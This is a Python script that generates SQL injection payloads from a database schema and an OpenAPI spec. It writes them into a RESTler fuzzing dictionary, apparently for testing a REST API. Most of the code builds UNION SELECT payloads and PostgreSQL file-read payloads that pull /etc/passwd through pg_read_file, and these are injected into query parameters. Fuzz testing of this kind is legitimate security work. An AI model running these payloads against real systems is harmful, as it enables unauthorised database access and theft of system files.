"""
This module is used to generate SQL injection payloads based on the SQL initialization script.
"""
import argparse
import json
import sys
import urllib.parse
from itertools import combinations, permutations
from pathlib import Path
from typing import List

import yaml

class SqlInjectionPayloadGenerator:
    def __init__(self, db_init_script_path) -> None:
        """
        Initialize the SqlInjectionPayloadGenerator.

        Args:
            db_init_script_path (str): The path to the SQL initialization script.
        """
        self.table_names = []
        self.columns_info = {}
        self.max_columns = 0
        self.max_columns_per_table = {}
        self.min_varchar_size = 255
        self.parse_sql_init_script(db_init_script_path)
        ########################################################
        self.sqli_template = "{value}'{payload}--"

    def parse_sql_init_script(self, file_path):
        """
        Parse an SQL script to extract table names, column names,
        and the max column count.

        Args:
            file_path (str): The path to the SQL script file.
        
        Raises:
            FileNotFoundError: If the file does not exist.
        """
        file_path = Path(file_path)
        if not file_path.exists() and not file_path.is_file():
            print(f"Please put {file_path} in the same directory as this script.",
                  file=sys.stderr)
            raise FileNotFoundError(f"File {file_path} does not exist.")

        with file_path.open('r') as file:
            lines = file.readlines()

        current_table = None
        for line in lines:
            line = line.strip()
            if line.lower().startswith('create table'):
                # Start of a new table; extract the table name
                parts = line.split()
                if "if not exists" in line.lower():
                    table_name = parts[5]
                else:
                    table_name = parts[2]
                self.table_names.append(table_name.strip('"'))
                current_table = table_name.strip('"')
                self.columns_info[current_table] = []
            elif current_table and ');' in line:
                # End of the table definition; Update the max column count
                self.max_columns_per_table[current_table] = len(self.columns_info[current_table])
                current_table = None
            elif current_table and line:
                # Extract column names and data types
                parts = line.split()
                column_name = parts[0].strip('"')
                data_type = parts[1] if len(parts) > 1 else None
                info = (column_name, data_type)

                # Save the minimum VARCHAR size
                if data_type and 'VARCHAR' in data_type:
                    size = int(data_type.split('(')[1].split(')')[0])
                    if not self.min_varchar_size or size < self.min_varchar_size:
                        self.min_varchar_size = size

                # Append the column info to the current table
                self.columns_info[current_table].append(info)
                self.max_columns = max(self.max_columns,
                                       len(self.columns_info[current_table]))
    
    def __str__(self) -> str:
        return (
            f"Extracted Table Names: {self.table_names}\n"
            f"Column Names per Table: {self.columns_info}\n"
            f"Maximum number of columns seen: {self.max_columns}\n"
            f"Maximum number of columns per table: {self.max_columns_per_table}\n"
        )

    ########################################################

    def fill_sqli_template(self, value, payload) -> str:
        """
        Fill the SQL injection template with the given values.

        Args:
        - value: The value to be injected. Can be a string or an integer.
        - payload: The SQL injection payload to be injected.
        """
        return self.sqli_template.format(value=value, payload=payload)
    
    def generate(self) -> list:
        ret = []
        types = ['', 'rusa', 0, 1, 4, 42]
        payloads = ['']

        payloads += self.generate_union_select_payloads()
        payloads += self.generate_file_read_payloads()

        for type in types:
            for payload in payloads:
                ret.append(self.fill_sqli_template(type, payload))

        # Remove duplicates before returning
        return list(set(ret))

    def permutate_columns(self, columns) -> list:
        """
        Generate all permutations of column names and NULL, including all subset sizes.

        Args:
        - columns: A list of tuples (column_name, column_type)
        
        Returns:
        - A list of strings, each representing a permutation of column fillers
        """
        # Extract column names from the input
        column_names = [
            col[0] 
            for col in columns 
            if col[0] != 'CONSTRAINT' 
            and not col[0].startswith('FOREIGN')
        ]
        
        # Include NULL
        column_names_with_null = column_names + ['NULL']

        all_permutations = []
        
        # Generate permutations for all combinations of all lengths
        for length in range(1, len(column_names_with_null) + 1):
            # Generate all combinations of a certain length
            for subset in combinations(column_names_with_null, length):
                # Generate all permutations of each combination
                for perm in permutations(subset):
                    all_permutations.append(perm)

        return [', '.join(perm) for perm in all_permutations]
    
    def generate_union_select_payloads(self) -> list:
        payloads = []
        
        for table, columns in self.columns_info.items():
            column_permutations = self.permutate_columns(columns)
            
            for fillers in column_permutations:
                payload = f" UNION SELECT {fillers} FROM {table}"
                payloads.append(payload)
        
        return payloads

    def permutate_type_columns(self, columns) -> list:
        """
        Generate all permutations of column values, with file read payloads.

        Args:
        - columns: A list of tuples (column_name, column_type)
        
        Returns:
        - A list of tuples, each representing a permutation of column fillers
        """
        # Filter columns
        columns = [
            (col[0], col[1])
            for col  in columns 
            if col[0] != 'CONSTRAINT' 
            and not col[0].startswith('FOREIGN')
        ]
        
        all_permutations = []
        
        # Generate permutations for all combinations of all lengths
        for length in range(1, len(columns) + 1):
            # Generate all combinations of a certain length
            for subset in combinations(columns, length):
                # Generate all permutations of each combination
                for perm in permutations(subset):
                    # Initialize a list to hold the modified column values
                    modified_perm = []

                    for col_name, col_type in perm:
                        if 'VARCHAR' in col_type:
                            # Extract size from col_type and use it to truncate the file read
                            size = col_type.split('(')[1].split(')')[0]
                            modified_perm.append(f"(SELECT LEFT(pg_read_file('/etc/passwd'), {size}))")
                            # f"pg_read_file('PG_VERSION', 1, 2)"
                        elif 'INT' in col_type or 'SERIAL' in col_type:
                            # Use 42 for integer columns
                            modified_perm.append("42")
                        elif 'BOOLEAN' in col_type:
                            # Use a boolean value for boolean columns
                            modified_perm.append("TRUE")
                        elif 'DATE' in col_type or 'TIMESTAMP' in col_type:
                            # Use a sample date for date and timestamp columns
                            modified_perm.append("'2024-01-01'")
                        else:
                            # For other data types, use a generic placeholder or adjust as needed
                            modified_perm.append("'placeholder_value'")

                    # Collect the modified permutation
                    all_permutations.append(", ".join(modified_perm))

        return all_permutations

    def generate_file_read_payloads(self) -> list:
        file_read_payload = f"(SELECT LEFT(pg_read_file('/etc/passwd'), {self.min_varchar_size}))"
        payloads = []

        for table, columns in self.columns_info.items():
            # Generate permutations for all combinations of all lengths
            column_permutations = self.permutate_type_columns(columns)
            
            for fillers in column_permutations:
                payloads.extend([
                    f", {fillers} FROM {table}",
                    f", {fillers} )",
                    f", {fillers} ) RETURNING id"
                ])
            
            # Create type non-spec adhering permutations with file read payload
            for i in range(self.max_columns_per_table[table] + 1):
                for filler_type in ["'string'", 42]:
                    # -1 to exclude the file read payload
                    filler_values = ', '.join([str(filler_type)] * (i - 1))

                    base_payload = f"{file_read_payload}, {filler_values}"
                    payloads.extend([
                        f", {base_payload} FROM {table}",
                        f", {base_payload} )",
                        f", {base_payload} ) RETURNING id"
                    ])
        
        return payloads

class OpenAPIParser:
    def __init__(self, spec_path: str = 'openapi.yml'):
        self.spec_path = spec_path
        self.openapi_spec = self.load_spec()

    def load_spec(self):
        """Loads the OpenAPI specification from the given file path."""
        try:
            with open(self.spec_path, 'r') as file:
                return yaml.safe_load(file)
        except FileNotFoundError:
            print(f"Error: File {self.spec_path} not found.")
            return {}
        except yaml.YAMLError as exc:
            print(f"Error while parsing YAML file: {exc}")
            return {}

    def get_parameters_from_endpoint(self, endpoint_spec):
        """Extracts GET parameters from the endpoint specification."""
        parameters = []
        for method, method_spec in endpoint_spec.items():
            if method.lower() == 'get':
                parameters.extend(method_spec.get('parameters', []))
        return parameters

    def extract_parameter_names(self, parameters):
        """Extracts parameter names from the parameters list."""
        return [param['name'] for param in parameters]

    def gather_get_methods(self) -> List[str]:
        """Gathers all GET method parameters from the OpenAPI specification."""
        all_get_params = []
        paths = self.openapi_spec.get('paths', {})
        for path, path_spec in paths.items():
            endpoint_parameters = self.get_parameters_from_endpoint(path_spec)
            param_names = self.extract_parameter_names(endpoint_parameters)
            all_get_params.extend(param_names)
        return list(set(all_get_params))

class DictWriter:
    @staticmethod
    def generate_default_dict():
        """Generates the default dictionary structure."""
        return {
            "restler_fuzzable_string": ["fuzzstring"],
            "restler_fuzzable_string_unquoted": [],
            "restler_fuzzable_datetime": ["2019-06-26T20:20:39+00:00"],
            "restler_fuzzable_datetime_unquoted": [],
            "restler_fuzzable_date": ["2019-06-26"],
            "restler_fuzzable_date_unquoted": [],
            "restler_fuzzable_uuid4": ["566048da-ed19-4cd3-8e0a-b7e0e1ec4d72"],
            "restler_fuzzable_uuid4_unquoted": [],
            "restler_fuzzable_int": ["1"],
            "restler_fuzzable_number": ["1.23"],
            "restler_fuzzable_bool": ["true"],
            "restler_fuzzable_object": ["{ \"fuzz\": false }"],
            "restler_custom_payload": {},
            "restler_custom_payload_unquoted": {},
            "restler_custom_payload_uuid4_suffix": {},
            "restler_custom_payload_header": {},
            "restler_custom_payload_query": {}
        }
    
    @staticmethod
    def custom_url_encode(payloads):
        safe_chars = "',/()"
        return [urllib.parse.quote(payload, safe=safe_chars) for payload in payloads]

    def write_json(self, payloads, get_params: List[str] = None,
                   dict_path: str = None):
        """Create or update payloads in the specified JSON dict_path."""
        try:
            # if not Path(dict_path).exists():
            #     data = self.generate_default_dict()
            # else:
            #     with open(dict_path, 'r') as file:
            #         data = json.load(file)
            data = self.generate_default_dict()

            data['restler_fuzzable_string'].extend(payloads)
            if get_params:
                encoded_payloads = DictWriter.custom_url_encode(payloads)
                data['restler_custom_payload'] = {param: encoded_payloads.copy() for param in get_params}

            with open(dict_path, 'w') as file:
                json.dump(data, file, indent=0) # only newlines
        except FileNotFoundError:
            print(f"Error: File {dict_path} not found.")
        except json.JSONDecodeError as exc:
            print(f"Error while parsing JSON file: {exc}")

def update_engine_settings(engine_settings, margin, payloads):
    with open(engine_settings, 'r') as file:
        data = json.load(file)
        data['max_combinations'] = len(payloads) + margin

    with open(args.engine_settings, 'w') as file:
        json.dump(data, file, indent=2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script to process SQL script, OpenAPI file, and dictionary path")
    parser.add_argument("--dict-path", type=str, default=str(Path(__file__).parent / 'sqliDict.json'), help="Path to the dictionary file")
    parser.add_argument("--api_spec", type=str, default=str(Path(__file__).parent / 'openapi.yml'), help="Path to the OpenAPI file")
    parser.add_argument("--sql", type=str, default=str(Path(__file__).parent / 'initDB.sql'), help="Path to the SQL script file")
    parser.add_argument("--engine-settings", type=str, default=str(Path(__file__).parent / 'Compile' / 'engine_settings.json'), help="Path to the engine settings file")
    parser.add_argument("--engine-margin", type=int, default=8, help="Number of additional payloads to add to engine settings")
    args = parser.parse_args()

    sql_script_path = Path(args.sql)
    openapi_path = Path(args.api_spec)
    dict_path = Path(args.dict_path)

    payload_generator = SqlInjectionPayloadGenerator(sql_script_path)
    spec_parser = OpenAPIParser(openapi_path)

    payloads = payload_generator.generate()
    get_params = spec_parser.gather_get_methods()

    DictWriter().write_json(payloads, get_params=get_params, dict_path=dict_path)

    print("Payloads generated successfully!")

    update_engine_settings(args.engine_settings, args.engine_margin, payloads)
    print("Engine settings updated successfully!")

